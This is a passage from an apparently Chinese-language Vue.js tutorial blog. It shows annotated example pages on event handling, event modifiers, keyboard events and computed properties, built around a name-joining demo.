class="string">&#x27;清华大学&#x27;</span>,</span></span><br><span class="line"><span class="javascript">address:<span class="string">&#x27;北京&#x27;</span></span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="8-Vue事件处理"><a href="#8-Vue事件处理" class="headerlink" title="8.Vue事件处理"></a>8.Vue事件处理</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>事件处理<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">事件的基本使用：</span></span><br><span class="line"><span class="comment">1.使用v-on:xxx或者@xxx绑定事件，其中xxx是事件名；</span></span><br><span class="line"><span class="comment">2.事件回调需要配置在methods对象中，最终会在vm上；</span></span><br><span class="line"><span class="comment">3.methods中配置的函数，不要用箭头函数，否则this就不是vm；</span></span><br><span class="line"><span class="comment">4.methods中配置的函数，都是被Vue管理的函数，this的指向是vm 或 组件实例对象；</span></span><br><span class="line"><span class="comment">5.@click=&quot;demo&quot;和@click=&quot;demo($event)&quot;效果一致，但后者可以传参；</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>欢迎来到&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--普通写法--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;button v-on:click=&quot;showInfo&quot;&gt;点我提示信息&lt;/button&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--简写--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showInfo1&quot;</span>&gt;</span>点我提示信息1(不传参)<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showInfo2($event,15,user,&#x27;祝你玩得开心！&#x27;)&quot;</span>&gt;</span>点我提示信息2(传参)<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;电信学院&#x27;</span>,</span></span><br><span class="line"><span class="javascript">user:<span class="string">&#x27;小明&#x27;</span></span></span><br><span class="line">&#125;,</span><br><span class="line">methods:&#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">showInfo1</span>(<span class="params">event</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="comment">//console.log(event.target.innerText)</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//console.log(this)//此处this是vm</span></span></span><br><span class="line"><span class="javascript">alert(<span class="string">&#x27;同学你好1！&#x27;</span>)</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">showInfo2</span>(<span class="params">event,number,userName,info</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="comment">//console.log(event.target.innerText)</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//console.log(this)//此处this是vm</span></span></span><br><span class="line"><span class="javascript">alert(number+<span class="string">&#x27;号，&#x27;</span>+userName+<span class="string">&#x27;同学你好！&#x27;</span>+info)</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(event)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="9-事件修饰符"><a href="#9-事件修饰符" class="headerlink" title="9.事件修饰符"></a>9.事件修饰符</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>事件修饰符<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">*&#123;</span><br><span class="line"><span class="css"><span class="attribute">margin-top</span>: <span class="number">15px</span>;</span></span><br><span class="line">&#125;</span><br><span class="line">.demo1&#123;</span><br><span class="line"><span class="css"><span class="attribute">height</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="css"><span class="attribute">background-color</span>: skyblue;</span></span><br><span class="line">&#125;</span><br><span class="line">.box1&#123;</span><br><span class="line"><span class="css"><span class="attribute">padding</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="css"><span class="attribute">background-color</span>: skyblue;</span></span><br><span class="line">&#125;</span><br><span class="line">.box2&#123;</span><br><span class="line"><span class="css"><span class="attribute">padding</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="css"><span class="attribute">background-color</span>: orange;</span></span><br><span class="line">&#125;</span><br><span class="line">.list&#123;</span><br><span class="line"><span class="css"><span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css"><span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css"><span class="attribute">background-color</span>: orangered;</span></span><br><span class="line"><span class="css"><span class="attribute">overflow</span>: auto;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="css"><span class="selector-tag">li</span>&#123;</span></span><br><span class="line"><span class="css"><span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">Vue中的事件修饰符：</span></span><br><span class="line"><span class="comment">1.prevent：阻止默认事件（常用）；</span></span><br><span class="line"><span class="comment">2.stop：阻止事件冒泡（常用）；</span></span><br><span class="line"><span class="comment">3.once：事件只触发一次（常用）；</span></span><br><span class="line"><span class="comment">4.capture：使用事件的捕获模式；</span></span><br><span class="line"><span class="comment">5.self：只有event.target是当前操作的元素时才触发事件；</span></span><br><span class="line"><span class="comment">6.passive：事件的默认行为立即执行，无需等待事件回调执行完毕；</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>欢迎来到&#123;&#123;name&#125;&#125;学习！<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--阻止默认事件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.baidu.com&quot;</span> @<span class="attr">click.prevent</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span>点我提示信息<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--阻止事件冒泡--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;demo1&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click.stop</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span>点我提示信息<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--事件只触发一次--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click.once</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span>点我提示信息<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--使用事件的捕获模式--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box1&quot;</span> @<span class="attr">click.capture</span>=<span class="string">&quot;showMsg(1)&quot;</span>&gt;</span></span><br><span class="line">div1</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box2&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;showMsg(2)&quot;</span>&gt;</span></span><br><span class="line">div2</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--只有event.target是当前操作的元素时才触发事件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;demo1&quot;</span> @<span class="attr">click.self</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span>点我提示信息<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--事件的默认行为立即执行，无需等待事件回调执行完毕--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--@wheel：滚轮滚动事件；@scroll：滚动条滚动事件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> @<span class="attr">wheel.passive</span>=<span class="string">&quot;demo&quot;</span> <span class="attr">class</span>=<span class="string">&quot;list&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>4<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--先阻止事件冒泡，再阻止默认事件(修饰符可以连着写)--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;demo1&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.baidu.com&quot;</span> @<span class="attr">click.stop.prevent</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span>点我提示信息<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;电信学院&#x27;</span>,</span></span><br><span class="line">&#125;,</span><br><span class="line">methods:&#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">showInfo</span>(<span class="params">event</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="comment">//原生js中的方法</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//event.preventDefault()阻止默认事件</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//event.stopPropagation()阻止事件冒泡</span></span></span><br><span class="line"><span class="javascript">alert(<span class="string">&#x27;同学你好！&#x27;</span>)</span></span><br><span class="line"><span class="javascript"><span class="comment">//console.log(event.target)//(只有event.target是当前操作的元素时才触发事件)的案例调用</span></span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">showMsg</span>(<span class="params">msg</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(msg+<span class="string">&#x27;&#x27;</span>)</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">demo</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">20000</span>; i++) &#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">&#x27;#&#x27;</span>)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">&#x27;累坏了&#x27;</span>)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="10-键盘事件"><a href="#10-键盘事件" class="headerlink" title="10.键盘事件"></a>10.键盘事件</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>键盘事件<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">1.Vue中常用的按键别名：</span></span><br><span class="line"><span class="comment">回车 =&gt; enter</span></span><br><span class="line"><span class="comment">删除 =&gt; delete</span></span><br><span class="line"><span class="comment">退出 =&gt; esc</span></span><br><span class="line"><span class="comment">空格 =&gt; space</span></span><br><span class="line"><span class="comment">换行 =&gt; tab (特殊，必须配个@keydown使用)</span></span><br><span class="line"><span class="comment">上 =&gt; up</span></span><br><span class="line"><span class="comment">下 =&gt; down</span></span><br><span class="line"><span class="comment">左 =&gt; left</span></span><br><span class="line"><span class="comment">右 =&gt; right</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2.Vue中未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为keybab-case（短横线命名）</span></span><br><span class="line"><span class="comment">3.系统修饰键（用法特殊）：Ctrl、alt、shift、meta</span></span><br><span class="line"><span class="comment">（1）.配合keyup使用：按下修饰键的同时，在按下其他键，随后释放其他键，事件才被触发。</span></span><br><span class="line"><span class="comment">（2）.配合keydown使用：正常触发事件。</span></span><br><span class="line"><span class="comment">4.也可以使用keycode去指定具体的按键（不推荐）</span></span><br><span class="line"><span class="comment">5.Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>欢迎来到&#123;&#123;name&#125;&#125;学习<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;input type=&quot;text&quot; placeholder=&quot;按下回车提示输入&quot; @keyup.enter=&quot;showInfo&quot;&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;input type=&quot;text&quot; placeholder=&quot;按下回车提示输入&quot; @keyup.caps-lock=&quot;showInfo&quot;&gt;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;按下回车提示输入&quot;</span> @<span class="attr">keydown.tab</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;电信学院&#x27;</span>,</span></span><br><span class="line">&#125;,</span><br><span class="line">methods:&#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">showInfo</span>(<span class="params">e</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(e.target.value)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="11-计算属性—姓名案例（插值语法实现）"><a href="#11-计算属性—姓名案例（插值语法实现）" class="headerlink" title="11.计算属性—姓名案例（插值语法实现）"></a>11.计算属性—姓名案例（插值语法实现）</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>计算属性—姓名案例（插值语法实现）<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">姓：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;firstName&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;lastName&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">姓名：<span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;firstName.slice(0,3)&#125;&#125;-&#123;&#123;lastName&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">firstName:<span class="string">&#x27;张&#x27;</span>,</span></span><br><span class="line"><span class="javascript">lastName:<span class="string">&#x27;三&#x27;</span>,</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="12-计算属性—姓名案例（methods实现）"><a href="#12-计算属性—姓名案例（methods实现）" class="headerlink" title="12.计算属性—姓名案例（methods实现）"></a>12.计算属性—姓名案例（methods实现）</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>计算属性—姓名案例（methods实现）<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">姓：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;firstName&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;lastName&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">姓名：<span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;fullName()&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">firstName:<span class="string">&#x27;张&#x27;</span>,</span></span><br><span class="line"><span class="javascript">lastName:<span class="string">&#x27;三&#x27;</span>,</span></span><br><span class="line">&#125;,</span><br><span class="line">methods:&#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">fullName</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> <span class="built_in">this</span>.firstName+<span class="string">&#x27;-&#x27;</span>+<span class="built_in">this</span>.lastName</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="13-计算属性—姓名案例（计算属性实现）"><a href="#13-计算属性—姓名案例（计算属性实现）" class="headerlink" title="13.计算属性—姓名案例（计算属性实现）"></a>13.计算属性—姓名案例（计算属性实现）</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>计算属性—姓名案例（计算属性实现）<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">计算属性：</span></span><br><span class="line"><span class="comment">1.定义：要用的属性不存在，要通过已有的属性计算得来。</span></span><br><span class="line"><span class="comment">2.原理：底层借助了Object.defineproperty方法提供的getter和setter。</span></span><br><span class="line"><span class="comment">3.get函数什么时候执行？</span></span><br><span class="line"><span class="comment">(1).初次读取fullName时。</span></span><br><span class="line"><span class="comment">(2).所依赖的数据发生改变时。</span></span><br><span class="line"><span class="comment">4.优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。</span></span><br><span class="line"><span class="comment">5.备注：</span></span><br><span class="line"><span class="comment">(1).计算属性最终出现在vm上，直接读取使用即可。</span></span><br><span class="line"><span class="comment">(2).如果计算属性要修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">姓：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;firstName&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> 